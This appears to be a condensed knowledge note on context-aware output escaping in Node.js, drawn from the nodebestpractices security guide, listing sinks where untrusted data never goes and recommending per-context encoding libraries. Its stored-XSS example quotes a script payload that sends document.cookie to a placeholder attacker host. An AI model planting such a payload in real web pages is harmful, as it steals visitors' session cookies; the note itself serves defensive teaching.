<!-- capsule-v2 -->
# Context-aware output escaping — entity-encoding HTML is NOT enough; each sink has its own escape grammar

**Source:** nodebestpractices CC-BY-SA-4.0 `master@dc3d60c2`; Codebase Memory `nodebestpractices`. **Question:** Where can untrusted data NEVER go, and which encoding does each legal sink require?

## Five forbidden sinks; escape by output context, not globally
**Path/Symbol:** `sections/security/escape-output.md` (never-put list :10-21, stored-XSS example :25-33, OWASP quotes :56-67).
**Signature:** escaping libraries (`escape-html`, `node-esapi`) applied per-context: HTML body, attribute, JS, CSS, URL.
**Data Shape:** forbidden sinks: directly inside `<script>`, inside HTML comments, as attribute NAME, as tag NAME, directly inside `<style>`.

### Decisive source
```html
<!-- escape-output.md :11-19 — the five NEVER positions -->
<script>...NEVER PUT UNTRUSTED DATA HERE...</script>
<!--...NEVER PUT UNTRUSTED DATA HERE...-->
<div ...NEVER PUT UNTRUSTED DATA HERE...=test />
<NEVER PUT UNTRUSTED DATA HERE... href="/test" />
<style>...NEVER PUT UNTRUSTED DATA HERE...</style>
```

**Flow:** attacker-stored `<script>window.location='http://attacker/?cookie='+document.cookie</script>` renders verbatim from your DB (:26-32) → every render is an XSS delivery. Mitigation: treat untrusted chunks as content-only via context-correct escaping.
**Invariant:** THE PORTER'S MISS (OWASP quote :66-67): "HTML entity encoding doesn't work if you're putting untrusted data inside a `<script>` tag anywhere, or an event handler attribute ..., or inside CSS, or in a URL ... You MUST use the escape syntax for the part of the HTML document you're putting untrusted data into." One global entity-pass creates false safety while script/style/URL sinks stay live. Hand-rolled encoders carry pitfalls (escape-shortcuts misinterpreted by nested parsers; forgetting to escape the escape character) → use a security-focused encoding library (:59).
**Probe:** no runner upstream. Deterministic probe: `grep -c 'NEVER PUT UNTRUSTED DATA HERE' sections/security/escape-output.md` >= 5.
**Retrieve:** **Retrieve:** doc-shaped/BM25-gap note — `search_graph` text queries return ZERO on this graph (Section nodes carry no searchable tokens); use `search_code`, executed live:
```bash
codebase-memory-mcp cli search_code '{"project": "nodebestpractices", "pattern": "NEVER PUT UNTRUSTED DATA HERE", "limit": 10}'
# resolves `sections/security/escape-output.md` line-exact (verified 2026-08-24)
```

## Verdict
Adopt templating-engine auto-escaping (EJS/Pug/React per OWASP-A7 checklist capsule) plus explicit library escaping for raw sinks. Adapt per-framework auto-context rules; know their limits. Omit hand-written encoders entirely.
